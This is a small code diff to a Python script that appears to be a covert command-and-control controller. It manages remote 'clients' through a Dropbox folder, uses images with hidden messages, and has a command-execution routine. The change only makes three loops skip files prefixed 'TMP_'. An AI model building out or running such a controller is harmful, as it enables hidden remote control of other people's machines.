@@ -79,7 +79,7 @@ def get_alive_clients(dbx, timedout_clients):
     #get list of client names that haven't timed out
     ret = []
     for entry in dbx.files_list_folder('/art').entries:
-        if entry.name in timedout_clients:
+        if entry.name in timedout_clients or entry.name.startswith('TMP_'):
             continue
         ret.append(entry.name)
     return ret
@@ -150,7 +150,7 @@ def execute_command(dbx, command, client):
 def process_files(dbx, last_check, clients):
     #for each client
     for entry in dbx.files_list_folder('/art').entries:
-        if entry.name in timedout_clients:
+        if entry.name in timedout_clients or entry.name.startswith('TMP_'):
             continue
 
         #download image with secret message 
@@ -198,7 +198,7 @@ def cleanup(dbx, client):
 def update_timedout_clients(dbx, timedout_clients):
     #check if clients timed out
     for entry in dbx.files_list_folder('/art').entries:
-        if entry.name in timedout_clients:
+        if entry.name in timedout_clients or entry.name.startswith('TMP_'):
             continue
         dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
 
@@ -282,4 +282,3 @@ if __name__ == "__main__":
             elif res >= 0 or res == -3:
                 #set selected client
                 selected_client = res
-
